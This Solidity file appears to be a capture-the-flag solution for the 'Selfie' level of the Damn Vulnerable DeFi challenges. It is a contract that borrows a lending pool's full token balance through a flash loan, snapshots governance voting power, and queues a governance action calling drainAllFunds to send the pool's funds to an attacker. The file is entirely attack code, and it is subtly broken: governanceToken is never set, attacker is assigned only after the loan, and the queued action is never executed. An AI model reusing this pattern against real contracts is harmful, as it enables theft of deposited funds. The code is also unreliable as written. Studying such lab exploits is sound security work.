// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external;

    function transfer(address, uint256) external;

    function balanceOf(address account) external returns (uint256);
}

contract SelfieAttacker {
    uint256 poolBalance;
    address attacker;
    ISelfiePool poolAddress;
    ISimpleGovernance gov;
    IDamnValuableTokenSnapshot token;
    uint256 public actionId;

    DamnValuableTokenSnapshot public governanceToken;

    constructor(ISelfiePool _pool, ISimpleGovernance _gov, IDamnValuableTokenSnapshot _token) {
        poolAddress = _pool;
        gov = _gov;
        token = _token;
    }

    function attack(address _attacker) external {
        poolBalance = token.balanceOf(address(poolAddress));
        poolAddress.flashLoan(poolBalance);
        attacker =_attacker;
    }

    function receiveTokens(address, uint256 amount) external{
        governanceToken.snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        actionId = gov.queueAction(address(poolAddress), data, 0);
        token.transfer(address(poolAddress), amount);
    }
}